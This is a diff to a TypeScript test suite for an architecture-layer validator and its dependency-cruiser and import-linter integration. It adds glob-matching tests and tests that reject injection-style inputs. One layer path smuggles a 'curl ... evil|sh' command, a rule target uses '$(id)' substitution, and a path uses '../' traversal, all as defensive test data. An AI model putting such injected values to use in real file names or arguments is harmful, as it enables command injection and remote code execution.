@@ -27,7 +27,13 @@ test('validate: each way a block can be wrong is named', () => {
   bad('layer domain src/domain/**\nallow ghost -> domain', /unknown layer: ghost/)
   bad('layer domain src/domain/**\nlayer infra src/infra/**\nallow domain -> infra\nallow infra -> domain', /cycle/)
   bad('layer domain src/domain/**\nlayer infra src/infra/**\nforbid domain -> infra', /names a layer: use allow/)
-  bad('layer app src/app/**\nlayer inner src/app/inner/**', /nested layers/)
+  bad('layer app src/app/**\nlayer inner src/app/inner/**', /overlaps/)
+  bad('layer evil src/x;curl${IFS}evil|sh/**', /may use only letters/)
+  bad('layer domain src/domain/**\nforbid domain -> $(id)', /may use only letters/)
+  bad('layer bad;name src/bad/**', /layer name/)
+  bad('layer domain src/../domain/**', /no \.\./)
+  bad('layer feat src/features/*/domain/**\nlayer pay src/features/payments/**', /overlaps/)
+  assert.deepEqual(validateLayers(parse('layer domain src/domain/**\nlayer other src/domain-x/**')), [], 'a shared name prefix is not an overlap')
   assert.match(validateLayers(parse(GOOD), () => false).join('\n'), /src\/shop\/domain does not exist/)
 })
 
@@ -57,8 +63,15 @@ test('render: dependency-cruiser rules carry the why, the fix and the example; i
   assert.equal(moduleOf('src/shop/domain/**'), 'shop.domain')
 })
 
+test('render: ** is any depth, * one directory, and a glob without ** ends at a directory boundary', () => {
+  const re = (glob: string): RegExp => new RegExp(JSON.parse(renderDepcruise(parse(`layer aaa ${glob}\nlayer bbb src/bbb/**`)).split('module.exports = ')[1] as string).forbidden[0].from.path)
+  assert.ok(re('src/**/domain/**').test('src/a/b/domain/x.js') && re('src/**/domain/**').test('src/domain/x.js'))
+  assert.ok(re('src/features/*/domain/**').test('src/features/pay/domain/x.js') && !re('src/features/*/domain/**').test('src/features/domain/x.js'))
+  assert.ok(re('src/domain').test('src/domain/x.js') && !re('src/domain').test('src/domain-x/x.js'))
+})
+
 test('python violations are read per contract from import-linter output', () => {
-  const text = 'domain must not import infra BROKEN\n\n----------------\nBroken contracts\n----------------\n\ndomain must not import infra\n----------------------------\n\nshop.domain is not allowed to import shop.infra:\n\n-   shop.domain.order -> shop.infra.db (l.1)\n-   shop.domain.cart -> shop.infra.db (l.4)\n'
+  const text = 'domain must not import infra BROKEN\n\n----------------\nBroken contracts\n----------------\n\ndomain must not import infra\n----------------------------\n\nshop.domain is not allowed to import shop.infra:\n\n-   shop.domain.order -> shop.infra.db (l.1)\n-   shop.domain.cart -> shop.infra.db (l.4, l.9)\n'
   assert.deepEqual(pythonViolations(text, parse(GOOD)), { 'rig-domain-infra': ['shop.domain.order -> shop.infra.db', 'shop.domain.cart -> shop.infra.db'] })
 })
 
@@ -136,4 +149,14 @@ test('arch: approve refuses an invalid block and names the problem', () => {
   const r = approve()
   assert.equal(r.code, 1)
   assert.match(r.stderr, /\[layers\] layer a: token "a" is under 3/)
+})
+
+test('arch: a layer outside the pack root is refused an analyser config, loudly, and the edit-time sensor still enforces', () => {
+  sdlc(repo, ['init', '--stack', 'node'])
+  write(repo, 'lib/core/a.js', 'export const a = 1\n')
+  write(repo, '.rig/product/architecture.md', block('layer core lib/core/**\nlayer infra src/infra/**\nallow infra -> core'))
+  const r = approve()
+  assert.match(r.stdout, /scans src\/ only, and a layer lives elsewhere/)
+  assert.equal(fs.existsSync(path.join(repo, '.rig/gen/dependency-cruiser.cjs')), false)
+  assert.equal(JSON.parse(fs.readFileSync(path.join(repo, '.rig/layers.approved.json'), 'utf8')).analyser, null)
 })
